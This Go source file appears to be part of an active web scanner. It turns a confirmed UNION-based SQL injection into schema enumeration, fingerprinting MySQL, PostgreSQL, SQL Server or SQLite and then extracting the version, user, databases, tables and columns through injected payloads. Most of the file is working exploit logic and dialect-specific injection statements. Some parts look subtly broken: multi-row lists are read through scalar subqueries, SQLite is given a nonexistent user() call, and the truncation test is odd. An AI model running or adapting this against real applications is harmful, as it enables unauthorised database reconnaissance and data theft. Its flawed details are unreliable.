package active

// Schema enumeration behind a proven union-select injection.
//
// A union proof answers whether the statement the application builds hands an
// attacker's value back. That is a yes or a no, and an operator holding a yes
// cannot use it: the next question is what is in there, and only the database can
// answer it. This file asks, through the same proven column count.
//
// Every statement here is a `SELECT`. Nothing in this file writes, drops, alters or
// executes, and that is a property of the queries rather than a promise about the
// code — so a target that refuses one refuses it as a read.

import (
	"context"
	"fmt"
	"strings"
)

// DefaultEnumerateLimit is how many names one enumeration query returns unless the
// caller says otherwise.
//
// A default and not a ceiling: the caller's own limit replaces it, and the result
// says whether anything was cut, so a short list is never read as "that is
// everything".
const DefaultEnumerateLimit = 200

// enumLeft and enumRight bound the value a statement returned, so the value can be
// told apart from the page around it.
//
// The canary in a second column proves the statement ran; these markers say where
// its value stopped. Without them the only way to find the value is to search the
// body for a known string, which is the one thing a page quoting the request can
// produce.
const (
	enumLeft  = "rrE1"
	enumRight = "rrE2"
)

// enumDialect is one engine's spelling of the same questions.
type enumDialect struct {
	name string
	// wrap puts the markers around a statement. Concatenation is spelled per engine
	// because it is: MySQL has CONCAT, PostgreSQL and SQLite have `||`, SQL Server
	// has `+`.
	wrap string
	// identify is a statement only this engine can evaluate.
	//
	// The version banner cannot do this job: MySQL answers `version()` with
	// `8.0.36-0ubuntu0.22.04.1`, SQLite answers `sqlite_version()` with `3.45.1`,
	// and neither contains the engine's own name. A check by substring therefore
	// rejects two of the four dialects on a perfectly healthy target, and the
	// enumeration reports an empty schema where a schema exists.
	//
	// `identify` does the job instead, because every spelling of it is an unknown
	// function on the other three engines and answers with an error page — which is
	// exactly what a wrong dialect produces anyway. It costs one request per dialect
	// tried and buys the whole enumeration.
	identify  string
	version   string
	user      string
	databases string
	tables    string
	// columns takes the table name and yields one row per column, name and type
	// separated by a tab.
	columns string
}

// enumDialects are tried one at a time, in order of confidence. A wrong dialect
// costs one request and answers nothing; a right one costs one and answers the rest.
var enumDialects = []enumDialect{
	{
		name:      "mysql",
		wrap:      "CONCAT('" + enumLeft + "', %s, '" + enumRight + "')",
		identify:  "SELECT DATABASE()",
		version:   "SELECT version()",
		user:      "SELECT current_user()",
		databases: "SELECT schema_name FROM information_schema.schemata",
		tables:    "SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name",
		columns:   "SELECT column_name, data_type FROM information_schema.columns WHERE table_schema=database() AND table_name='%s' ORDER BY ordinal_position",
	},
	{
		name:      "postgresql",
		wrap:      "'" + enumLeft + "' || %s || '" + enumRight + "'",
		identify:  "SELECT current_schema()",
		version:   "SELECT version()",
		user:      "SELECT current_user",
		databases: "SELECT datname FROM pg_database WHERE datistemplate = false",
		tables:    "SELECT tablename FROM pg_tables WHERE schemaname = current_schema() ORDER BY tablename",
		columns:   "SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = current_schema() AND table_name = '%s' ORDER BY ordinal_position",
	},
	{
		name:      "mssql",
		wrap:      "'" + enumLeft + "' + %s + '" + enumRight + "'",
		identify:  "SELECT @@SERVERNAME",
		version:   "SELECT @@VERSION",
		user:      "SELECT SYSTEM_USER",
		databases: "SELECT name FROM sys.databases ORDER BY name",
		tables:    "SELECT t.name FROM sys.tables t ORDER BY t.name",
		columns:   "SELECT c.name, ty.name FROM sys.columns c JOIN sys.types ty ON c.user_type_id = ty.user_type_id WHERE c.object_id = OBJECT_ID('%s') ORDER BY c.column_id",
	},
	{
		name: "sqlite",
		wrap: "'" + enumLeft + "' || %s || '" + enumRight + "'",
		// SQLite's own function is the discriminator: no other engine in this table
		// has it, so answering at all is the answer.
		identify: "SELECT sqlite_version()",
		version:  "SELECT sqlite_version()",
		user:     "SELECT user()",
		// SQLite has no list of databases as a `SELECT`, and there is no portable
		// one; the main schema is reported and the statement is honest about being
		// the only one that can be.
		databases: "SELECT 'main'",
		tables:    "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name",
		columns:   "SELECT name, type FROM pragma_table_info('%s')",
	},
}

// quoteLiteral quotes a table name for the statement it will be read from.
func quoteLiteral(name string) string {
	return strings.ReplaceAll(strings.ReplaceAll(name, "'", "''"), "\\", "\\\\")
}

// enumExtract returns what a statement produced, given the page that carried it.
//
// It answers "no" when the markers are absent, when they are in the wrong order —
// which happens when a page prints the statement rather than running it — or when
// the value is empty. An empty value is a real answer for a table list that is
// empty, so it is reported as an empty string with `ok` true, and the caller
// decides what an empty list means.
func enumExtract(body string) (string, bool) {
	start := strings.Index(body, enumLeft)
	if start < 0 {
		return "", false
	}
	start += len(enumLeft)
	end := strings.Index(body[start:], enumRight)
	if end < 0 {
		return "", false
	}
	return strings.TrimSpace(body[start : start+end]), true
}

// enumSplitNames reads a newline-separated list of names.
func enumSplitNames(value string) []string {
	var out []string
	for _, line := range strings.Split(value, "\n") {
		if line = strings.TrimSpace(line); line != "" {
			out = append(out, line)
		}
	}
	return out
}

// enumSplitRows reads `name<TAB>type` lines.
func enumSplitRows(value string, limit int) [][2]string {
	var out [][2]string
	for _, line := range enumSplitNames(value) {
		if len(out) >= limit {
			break
		}
		name, kind, found := strings.Cut(line, "\t")
		if !found {
			name, kind = line, ""
		}
		out = append(out, [2]string{name, kind})
	}
	return out
}

// ExtractedTable is one table with the columns that were read from it.
type ExtractedTable struct {
	Name string `json:"name"`
	// Columns and ColumnTypes are the same read, split: a reader wants the names in
	// one list, and the types are a second question rather than an extension of the
	// first.
	Columns     []string `json:"columns,omitempty"`
	ColumnTypes []string `json:"column_types,omitempty"`
	// Truncated says the column list was cut at the bound, so a short list is not
	// read as the whole definition.
	Truncated bool `json:"truncated,omitempty"`
}

// Enumeration is what one injection point yielded, in the order a reader wants it:
// which engine, which session, what exists.
type Enumeration struct {
	Dialect   string   `json:"dialect"`
	Version   string   `json:"version,omitempty"`
	User      string   `json:"user,omitempty"`
	Databases []string `json:"databases,omitempty"`
	Tables    []string `json:"tables,omitempty"`
	// Detailed carries per-table columns, and is filled only when columns were asked
	// for: one request per table is a cost, and it is not spent unasked.
	Detailed []ExtractedTable `json:"detailed,omitempty"`
	// Truncated says any list was cut at the bound.
	Truncated bool `json:"truncated,omitempty"`
	// Requests is how many exchanges the enumeration cost, so a slow run is
	// accounted for rather than guessed at.
	Requests int `json:"requests"`
}

// EnumerationOptions is what the caller asked for.
//
// A struct rather than four parameters because the numbers are the part a reader is
// meant to see, and a function with four booleans does not say which is which.
type EnumerationOptions struct {
	// Columns asks for the column list of each table. Off by default: it is one
	// request per table.
	Columns bool
	// Table limits the column read to one named table, which is how a caller asks
	// about `users` without paying for the whole schema.
	Table string
	// Limit is how many names one query returns. Zero means DefaultEnumerateLimit.
	Limit int
}

// enumAsk runs one statement through the proven union and returns what it produced.
//
// The statement goes in the first column and a canary this run chose in the second,
// which is what separates execution from a page that quotes the request: a page
// that renders the statement carries both, and only a page that ran it carries the
// first alone. The canary is checked before the markers are read, so an echoed
// statement cannot be mistaken for an answer.
func (s *Suite) enumAsk(ctx context.Context, point Point, columns int, dialect enumDialect, statement string) (string, bool) {
	canary := newCanary("rrenum")
	if canary == "" {
		return "", false
	}
	cells := []string{"(" + fmt.Sprintf(dialect.wrap, statement) + ")", "'" + canary + "'"}
	for i := len(cells); i < columns; i++ {
		cells = append(cells, "NULL")
	}
	payload := "-1 UNION SELECT " + strings.Join(cells, ", ") + " -- -"
	resp, err := s.Transport.Fire(ctx, point, point.Param, payload, false, nil)
	if err != nil || resp == nil {
		return "", false
	}
	if !strings.Contains(resp.Body, canary) {
		// The canary did not come back, so the union did not render and the first
		// column was never computed.
		return "", false
	}
	if strings.Contains(resp.Body, statement) {
		// The page is showing the request. Its first cell would carry the statement,
		// not the value, and reporting it would be reporting a name that may not
		// exist.
		return "", false
	}
	return enumExtract(resp.Body)
}

// Enumerate reads the schema through a proved injection point.
//
// A nil result means the point was not a proved union, or no dialect answered. The
// two are told apart in the proof that is attached, and neither is reported as an
// empty schema: "the database has no tables" and "the scanner could not ask" are
// different claims, and a report that conflates them is worse than no report.
func (s *Suite) Enumerate(ctx context.Context, finding Finding, options EnumerationOptions) *Enumeration {
	point := pointOf(finding)
	columns, ok := unionColumns(finding)
	if !ok {
		// Without a proved column count there is no way to build a statement that
		// fits the query, and guessing one is the upstream defect this port removed.
		return nil
	}
	if s == nil || s.Transport == nil {
		return nil
	}
	limit := options.Limit
	if limit <= 0 {
		limit = DefaultEnumerateLimit
	}

	out := &Enumeration{}
	ask := func(dialect enumDialect, statement string) (string, bool) {
		before := s.Transport.Requests()
		value, fresh := s.enumAsk(ctx, point, columns, dialect, statement)
		out.Requests += s.Transport.Requests() - before
		return value, fresh
	}

	for _, dialect := range enumDialects {
		if ctx.Err() != nil {
			return out
		}
		if _, ok := ask(dialect, dialect.identify); !ok {
			// The engine did not answer its own function, so it is not this one.
			continue
		}
		out.Dialect = dialect.name
		if banner, ok := ask(dialect, dialect.version); ok {
			out.Version = firstLine(banner)
		}
		if user, ok := ask(dialect, dialect.user); ok {
			out.User = firstLine(user)
		}
		if value, ok := ask(dialect, dialect.databases); ok {
			names, cut := enumLimit(enumSplitNames(value), limit)
			out.Databases, out.Truncated = names, out.Truncated || cut
		}
		if value, ok := ask(dialect, dialect.tables); ok {
			names, cut := enumLimit(enumSplitNames(value), limit)
			out.Tables, out.Truncated = names, out.Truncated || cut
		}
		if !options.Columns {
			return out
		}
		targets := out.Tables
		if options.Table != "" {
			targets = []string{options.Table}
		}
		for _, table := range targets {
			if ctx.Err() != nil {
				return out
			}
			value, ok := ask(dialect, fmt.Sprintf(dialect.columns, quoteLiteral(table)))
			if !ok {
				continue
			}
			rows := enumSplitRows(value, limit)
			entry := ExtractedTable{Name: table, Truncated: len(rows) >= limit && limit < len(value)}
			for _, row := range rows {
				entry.Columns = append(entry.Columns, row[0])
				if row[1] != "" {
					entry.ColumnTypes = append(entry.ColumnTypes, row[1])
				}
			}
			out.Detailed = append(out.Detailed, entry)
			out.Truncated = out.Truncated || entry.Truncated
		}
		return out
	}
	return nil
}

// enumLimit cuts a list to the bound and says whether it cut it.
func enumLimit(names []string, limit int) ([]string, bool) {
	if len(names) <= limit {
		return names, false
	}
	return names[:limit], true
}

// firstLine keeps a version banner to one line: a banner with a newline in it would
// split a report row and read as two names.
func firstLine(value string) string {
	if index := strings.IndexAny(value, "\r\n"); index >= 0 {
		return strings.TrimSpace(value[:index])
	}
	return strings.TrimSpace(value)
}
